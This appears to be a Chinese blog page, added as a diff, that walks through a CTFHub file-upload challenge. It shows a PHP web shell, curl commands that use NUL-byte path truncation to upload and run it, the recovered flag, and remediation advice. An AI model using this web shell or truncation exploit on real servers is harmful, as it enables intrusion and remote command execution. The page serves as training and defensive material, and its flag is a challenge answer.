@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 文件上传 00截断 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 文件上传 - 00截断</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 文件上传</span>
+            <span class="tag"># 00截断</span>
+            <span class="tag"># RCE</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>文件上传 - 00截断</li>
+            <li><strong>题目方向：</strong>Web - 文件上传</li>
+            <li><strong>运行环境：</strong>PHP 5.2.17</li>
+            <li><strong>题目目标：</strong>利用 PHP 5.2 的 NUL 字节路径截断绕过受控文件名拼接，写入 PHP Web Shell 并读取 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>上传逻辑先通过 <code>pathinfo()</code> 提取文件扩展名，只允许 <code>jpg</code>、<code>png</code>、<code>gif</code>。通过校验后，服务端把可控的 <code>road</code> 参数、随机数、时间和扩展名拼接为最终路径：</p>
+        <pre>$name = basename($_FILES['file']['name']);
+$ext = pathinfo($name)['extension'];
+$des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
+move_uploaded_file($_FILES['file']['tmp_name'], $des);</pre>
+        <p>PHP 5.2 的文件系统函数在遇到 NUL 字节（<code>\x00</code>）时会截断后续路径。将 <code>road</code> 设置为 <code>/var/www/html/upload/shell.php%00</code> 后，实际写入路径变为 <code>/var/www/html/upload/shell.php</code>；随机文件名和 <code>.jpg</code> 后缀均被丢弃。</p>
+        <p>客户端文件名保持为合法的 <code>shell.jpg</code>，因此可以通过扩展名白名单；文件内容不做校验，可以直接写入 PHP 代码。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>构造 Payload：</strong>创建内容为 PHP 代码的 <code>shell.jpg</code>，通过 <code>cmd</code> 参数执行系统命令。
+                <pre>&lt;?php @system($_GET["cmd"]); ?&gt;</pre>
+            </li>
+            <li>
+                <strong>利用 NUL 截断上传：</strong>在 <code>road</code> 参数中加入 URL 编码的 <code>%00</code>，并保持上传文件名为合法的 <code>shell.jpg</code>。
+                <pre>curl -i -X POST \
+  -F "submit=Submit" \
+  -F "file=@shell.jpg;filename=shell.jpg;type=image/jpeg" \
+  "http://&lt;challenge-host&gt;:10800/?road=/var/www/html/upload/shell.php%00"</pre>
+                服务端返回 <code>上传成功</code>，实际文件被写入 <code>/var/www/html/upload/shell.php</code>。
+            </li>
+            <li>
+                <strong>验证命令执行：</strong>访问截断后生成的 Web Shell，确认命令以 <code>www-data</code> 身份执行。
+                <pre>curl --get \
+  --data-urlencode "cmd=id" \
+  "http://&lt;challenge-host&gt;:10800/upload/shell.php"
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+            </li>
+            <li>
+                <strong>定位 Flag 文件：</strong>搜索 Web 根目录中包含 <code>flag</code> 的文件。
+                <pre>find / -iname "*flag*" -type f 2&gt;/dev/null</pre>
+                <pre>/var/www/html/flag_2394721086.php</pre>
+            </li>
+            <li>
+                <strong>读取 Flag：</strong>Flag 位于 PHP 文件的注释中，直接通过 Web Shell 读取源码。
+                <pre>cat /var/www/html/flag_2394721086.php</pre>
+                <pre>&lt;?php // ctfhub{5e048cc870e76996674fc0cc}</pre>
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">ctfhub{5e048cc870e76996674fc0cc}</div>
+
+        <h2>五、修复建议</h2>
+        <ul>
+            <li><strong>拒绝控制字符：</strong>文件名和路径参数中拒绝 NUL、换行等控制字符，不能把用户输入直接交给文件系统函数。</li>
+            <li><strong>升级 PHP：</strong>使用仍受支持的 PHP 版本；现代 PHP 会拒绝包含 NUL 字节的路径，但仍不能依赖版本差异作为唯一防线。</li>
+            <li><strong>固定上传路径：</strong>上传目录应由服务端固定配置，禁止通过请求参数控制上传目录或目标文件名。</li>
+            <li><strong>服务端重命名：</strong>只信任文件内容检测结果，由服务端生成随机文件名和安全扩展名，不保留用户可控名称。</li>
+            <li><strong>隔离执行权限：</strong>将上传目录移出 Web 根目录或关闭脚本执行权限，并限制 Web 服务账户的系统权限。</li>
+        </ul>
+    </div>
+</body>
+</html>
